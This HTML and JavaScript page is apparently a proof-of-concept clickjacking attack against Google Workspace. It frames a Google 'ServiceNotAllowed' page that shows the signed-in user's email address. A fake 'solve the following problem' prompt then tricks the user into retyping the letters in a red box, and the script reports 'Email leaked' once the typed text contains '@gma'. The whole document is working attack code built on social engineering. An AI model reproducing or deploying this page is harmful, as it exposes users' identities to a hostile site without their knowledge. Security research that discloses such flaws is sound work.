<meta name="referrer" content="no-referrer" />

<iframe
    width="500px"
    height="500px"
    frameborder="0"
    style="position: fixed; top:-15px; display:none;"
    onload="load()"
    src="https://access.workspace.google.com/u/0/ServiceNotAllowed?application=216932279217&source=scrip&continue=https://chat.google.com/?authuser%3D1&pli=1">
</iframe>

<div
    style="position:fixed;top:0px;z-index:100;border-style:groove;border-color:red;border-width:5px;display:none;">
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</div>

<div style="position:fixed;top:30px;z-index:100;background-color:grey;">

    <h3>Loading...</h3>

    <b></b><br>

    <textarea id="answer"></textarea>

    <br><br><br>

</div>

<script>
function load() {
    document.querySelector('h3').textContent =
        'Solve the following problem to access the page.';

    document.querySelector('iframe').style =
        'position:fixed;top:-15px;display:block;';

    document.querySelector('div').style.display = 'block';

    document.querySelector('b').textContent =
        'Type letters inside the redbox to below textbox:';

    const text = document.querySelector('#answer');

    // Event ketika isi textarea berubah
    text.addEventListener('input', () => {
        if (text.value.includes('@gma')) {
            alert(`Email leaked:\n${text.value}`);
        } else {
            alert('Wrong letters. Try again!');
        }
    });

    // DOUBLE-CLICK → COPY ISI TEXTAREA
    text.addEventListener('dblclick', async () => {
        const value = text.value;

        if (!value) {
            return;
        }

        try {
            await navigator.clipboard.writeText(value);

            console.log('Berhasil dicopy:', value);
        } catch (error) {
            console.error('Gagal copy:', error);
        }
    });
}
</script>
